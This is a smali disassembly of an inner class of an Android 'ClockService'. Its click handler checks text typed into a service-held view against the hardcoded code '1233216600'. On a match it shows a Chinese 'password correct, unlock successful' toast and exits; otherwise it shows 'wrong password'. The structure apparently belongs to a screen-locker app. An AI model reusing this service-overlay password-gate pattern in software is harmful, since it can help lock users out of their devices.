.class Lcom/dulang/clock/ClockService$100000000;
.super Ljava/lang/Object;
.source "ClockService.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/dulang/clock/ClockService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000000"
.end annotation


# instance fields
.field private final this$0:Lcom/dulang/clock/ClockService;

.field private final val$viewGroup:Landroid/view/ViewGroup;


# direct methods
.method constructor <init>(Lcom/dulang/clock/ClockService;Landroid/view/ViewGroup;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move-object v4, v0

    invoke-direct {v4}, Ljava/lang/Object;-><init>()V

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lcom/dulang/clock/ClockService$100000000;->this$0:Lcom/dulang/clock/ClockService;

    move-object v4, v0

    move-object v5, v2

    iput-object v5, v4, Lcom/dulang/clock/ClockService$100000000;->val$viewGroup:Landroid/view/ViewGroup;

    return-void
.end method

.method static access$0(Lcom/dulang/clock/ClockService$100000000;)Lcom/dulang/clock/ClockService;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/dulang/clock/ClockService$100000000;->this$0:Lcom/dulang/clock/ClockService;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 8
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/View;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 48
    move-object v0, p0

    move-object v1, p1

    move-object v5, v0

    iget-object v5, v5, Lcom/dulang/clock/ClockService$100000000;->val$viewGroup:Landroid/view/ViewGroup;

    const v6, 0x7f0a0001

    invoke-virtual {v5, v6}, Landroid/view/ViewGroup;->findViewById(I)Landroid/view/View;

    move-result-object v5

    check-cast v5, Landroid/widget/EditText;

    move-object v2, v5

    .line 49
    move-object v5, v2

    invoke-virtual {v5}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v5

    invoke-interface {v5}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v5

    move-object v3, v5

    .line 50
    move-object v5, v3

    const-string v6, "1233216600"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    move-object v5, v0

    iget-object v5, v5, Lcom/dulang/clock/ClockService$100000000;->this$0:Lcom/dulang/clock/ClockService;

    const-string v6, "\u5bc6\u7801\u6b63\u786e\uff0c\u89e3\u9501\u6210\u529f"

    const/16 v7, 0x3e8

    invoke-static {v5, v6, v7}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v5

    invoke-virtual {v5}, Landroid/widget/Toast;->show()V

    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/System;->exit(I)V

    .line 51
    :goto_0
    return-void

    :cond_0
    move-object v5, v0

    iget-object v5, v5, Lcom/dulang/clock/ClockService$100000000;->this$0:Lcom/dulang/clock/ClockService;

    const-string v6, "\u5bc6\u7801\u9519\u8bef"

    const/16 v7, 0x3e8

    invoke-static {v5, v6, v7}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v5

    invoke-virtual {v5}, Landroid/widget/Toast;->show()V

    goto :goto_0
.end method
